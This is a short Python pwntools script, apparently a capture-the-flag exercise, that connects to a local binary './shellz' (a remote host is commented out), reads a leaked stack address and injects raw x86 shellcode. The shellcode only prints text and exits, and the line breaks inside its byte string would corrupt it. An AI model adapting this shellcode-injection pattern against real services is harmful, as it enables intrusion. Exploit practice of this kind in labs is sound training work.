#!/usr/bin/python3

from binascii import unhexlify
from pwn import *

PROGRAM_NAME = "sh"
ENCODING = "ascii"
REMOTE = 0
OFFSET = 16

# https://stackoverflow.com/a/15704848
ROM_HELLO = b'''\xb8\x04\x00\x00\x00
\xbb\x01\x00\x00\x00
\xb9\x00\x00\x00\x00
\xba\x0f\x00\x00\x00
\xcd\x80\xb8\x01\x00
\x00\x00\xbb\x00\x00
\x00\x00\xcd\x80'''

def io_beg():
	return process("./shellz")
	#remote('plzpwn.me', 2000)
	#process('./jump')
	
def io_rdy(x):
	#x.recvuntil("Time to break out your best shellcodez".encode(ENCODING), timeout = 10).decode(ENCODING)
	return x.recvuntil("Here is a random stack address: ".encode(ENCODING), timeout = 3).decode(ENCODING)

def main():
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			io = io_beg()
			print("BEGIN")
			print(io_rdy(io))
			stack = io.recvline().decode(ENCODING)
			
			print("stack: "+stack)
			
			
			io.send_raw(ROM_HELLO) # win
			io.sendline(b'') # fire!
			
			#io.interactive()
			
			print(io.recv(200, timeout = 5))
			
			stage = stage + 1
		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()
